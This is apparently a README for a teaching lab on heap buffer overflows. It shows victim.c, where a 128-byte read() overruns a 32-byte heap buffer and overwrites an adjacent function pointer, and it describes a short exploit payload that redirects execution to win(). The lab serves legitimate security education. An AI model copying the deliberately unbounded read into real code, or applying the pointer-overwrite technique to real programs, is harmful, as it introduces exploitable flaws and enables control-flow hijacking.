# 01 — Heap Buffer Overflow

The simplest possible demonstration that overflowing a *heap* buffer (not
the stack) can hijack control flow.

## The bug

`victim.c` allocates one heap object:

```c
struct heap_obj {
    char buf[32];       // attacker-controlled input lands here
    void (*fn)(void);   // called right after — sits directly after buf
};
```

`obj->fn` starts out pointing at `not_win()`. The program then does:

```c
read(0, obj->buf, 128);   // no bound check against sizeof(obj->buf) == 32
obj->fn();
```

Sending more than 32 bytes overflows `buf` and overwrites `obj->fn` with
attacker-chosen bytes, all *inside the same heap chunk* — no metadata
corruption needed, no stack involved.

## Layout

```
heap chunk:
  [ buf: 32 bytes ][ fn: 8-byte pointer ]
       offset 0          offset 32
```

Input shorter than 32 bytes: harmless. Input of `32 bytes filler + 8 bytes
address`: the last 8 bytes become the new value of `fn`, called immediately
after.

## Build

```
make
```

Compiler flags used (see top-level `CLAUDE.md` for the full reference
table):

- `-no-pie` — fixes the binary's load address so `win()`'s address is the
  same every run (no need to fight ASLR for this first example; ASLR/PIE
  is its own later example).
- `-fno-stack-protector`, `-D_FORTIFY_SOURCE=0` — irrelevant to a heap bug,
  disabled only to keep the build free of unrelated noise.

## Run it normally

```
$ printf 'hello\n' | ./victim
enter data: nothing interesting happened
```

## Run the exploit

```
$ make exploit
win() is at 0x4011d6
enter data: you win! control flow hijacked via heap overflow
```

`exploit.py` has no dependencies beyond the standard library: it reads
`win()`'s address out of the binary with `nm` (works here because the
binary isn't stripped and isn't PIE), then sends
`b"A"*32 + struct.pack("<Q", win_addr)` on stdin. The first 32 bytes fill
`buf`; the trailing 8 bytes land exactly on `obj->fn`.

## Talking points for the slide

- This is *not* a stack overflow — no return address, no saved frame
  pointer, no canary involved at all. It's purely "attacker bytes land
  past the end of a heap allocation and clobber the next thing in memory."
- GCC's own `-Wstringop-overflow` flags this exact bug at compile time
  here (suppressed in the Makefile) — but only because the buffer size is
  visible to the compiler. Real-world heap overflows are usually invisible
  to static analysis (size known only at runtime, buffer reached through a
  pointer/struct several calls away).
- Next examples build on this: stack overflows, canaries, NX, ASLR, and
  finally chaining gadgets into a full ROP chain when overwriting a
  pointer with a single function address isn't enough.
